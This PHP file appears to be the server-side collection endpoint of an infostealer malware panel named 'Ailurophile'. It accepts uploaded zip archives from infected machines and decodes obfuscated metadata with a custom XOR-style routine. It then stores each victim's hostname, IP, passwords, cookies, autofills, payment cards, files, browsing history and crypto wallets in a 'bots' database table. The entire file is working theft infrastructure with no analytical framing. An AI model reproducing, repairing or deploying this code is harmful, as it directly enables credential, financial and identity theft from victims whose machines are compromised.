<?php
include __DIR__ . "/api/config.php";


$data = isset($_GET['data']) ? $_GET['data'] : '';
$hash = isset($_GET['hash']) ? $_GET['hash'] : '';


if (empty($data) || empty($hash)) {
    echo json_encode(['status' => 'error', 'message' => 'Dont try to hack me !!!!']);
    exit();
}


$decrypted_data = ailurophile_decrypt(base64_decode($data), $hash);
$decoded_data = base64_decode($decrypted_data);
$obj = json_decode($decoded_data);


if (!$obj) {
    echo json_encode(['status' => 'error', 'message' => 'Dont try to hack me !!!!']);
    exit();
}

// Đường dẫn lưu trữ tệp tải lên
$uploadDir = 'herasvnxailurophile/';

// Kiểm tra và tạo thư mục nếu chưa tồn tại
if (!is_dir($uploadDir)) {
    mkdir($uploadDir, 0777, true);
}

$fileName = generateFileName($uploadDir);
$destPath = $uploadDir . $fileName;

// Kiểm tra xem tệp đã được tải lên thông qua yêu cầu POST chưa
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $file = $_FILES['file'];
    $logFile = $destPath . '/log.txt'; 
    $destPath = 'herasvnxailurophile/' . uniqid() . '-' . basename($file['name']); 
    function writeLog($message, $logFile) {
        file_put_contents($logFile, date('Y-m-d H:i:s') . " - " . $message . PHP_EOL, FILE_APPEND);
    }
    if ($file['error'] === UPLOAD_ERR_OK) {
        $fileTmpPath = $file['tmp_name'];
        $fileSize = $file['size'];
        $fileType = $file['type'];
        writeLog("File uploaded: " . $file['name'] . " | Size: " . $fileSize . " bytes | Type: " . $fileType, $logFile);
        if (!is_dir(dirname($destPath))) {
            mkdir(dirname($destPath), 0777, true);
            writeLog("Created directory: " . dirname($destPath), $logFile);
        }

        if (is_uploaded_file($fileTmpPath)) {
            if (move_uploaded_file($fileTmpPath, $destPath)) {
                $fileUrl = 'http://' . $_SERVER['HTTP_HOST'] . '/' . $destPath;
                writeLog("File moved successfully to: " . $destPath, $logFile);

                $create_at = date('Y-m-d H:i:s');
                $stmt = $pdo->prepare("INSERT INTO bots (user_id, path_file, created_at, bot_hostname, bot_ip, bot_type, bot_passwords, bot_cookies, bot_autofills, bot_cards, bot_files, bot_history, bot_wallet, bot_country) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
                if (!isset($obj->country)) {
                    $obj->country = "";
                }
                $stmt->execute([$obj->user_id, basename($destPath), $create_at, $obj->hostname, $obj->ip, $obj->type, $obj->passwords, $obj->cookies, $obj->autofills, $obj->cards, $obj->files, $obj->history, $obj->wallet, $obj->country]);

                writeLog("Inserted into database: " . $fileUrl, $logFile);

                echo json_encode(['status' => 'success', 'message' => 'File uploaded and saved successfully.']);
            } else {
                writeLog("Failed to move uploaded file.", $logFile);
                echo json_encode(['status' => 'error', 'message' => 'Failed to move uploaded file.']);
            }
        } else {
            writeLog("Invalid uploaded file: " . $fileTmpPath, $logFile);
            echo json_encode(['status' => 'error', 'message' => 'Invalid file upload.']);
        }
    } else {
        writeLog("File upload error: " . $file['error'], $logFile);
        echo json_encode(['status' => 'error', 'message' => 'File upload error.']);
    }
} else {
    writeLog("Invalid request method or no file uploaded.", $logFile);
    echo json_encode(['status' => 'error', 'message' => 'Invalid request.']);
}


// Hàm giải mã tùy chỉnh
function ailurophile_decrypt($data, $key) {
   if (empty($key)) {
        throw new Exception("Decryption key cannot be empty");
    }
    
    $key_length = strlen($key);
    $data = base64_decode($data);
    $data_length = strlen($data);
    $decrypted_data = '';

    for ($i = 0; $i < $data_length; $i++) {
        $decrypted_data .= chr((ord($data[$i]) - ord($key[$i % $key_length]) + 256) % 256);
    }

    return $decrypted_data;
}

// Hàm tạo tên tệp duy nhất
function generateFileName($uploadDir) {
    do {
        $newFileName = uniqid('Ailurophile_', true) . '.zip';
    } while (file_exists($uploadDir . $newFileName));
    return $newFileName;
}
?>
